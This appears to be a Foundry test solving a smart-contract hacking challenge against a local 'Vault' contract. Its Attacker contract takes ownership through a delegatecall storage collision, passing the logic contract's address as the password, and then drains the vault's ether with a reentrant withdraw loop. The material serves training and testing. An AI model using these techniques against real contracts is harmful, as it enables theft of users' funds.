// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        Attacker attacker = new Attacker(vault, logic);
        attacker.attack{value: address(vault).balance}();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}

contract Attacker {
    Vault vault;
    VaultLogic logic;

    constructor(Vault _vault, VaultLogic _logic) {
        vault = _vault;
        logic = _logic;
    }

    function attack() public payable {
        bytes32 password = bytes32(uint256(uint160(address(logic))));
        VaultLogic(address(vault)).changeOwner(password, address(this));
        vault.openWithdraw();
        vault.deposite{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}
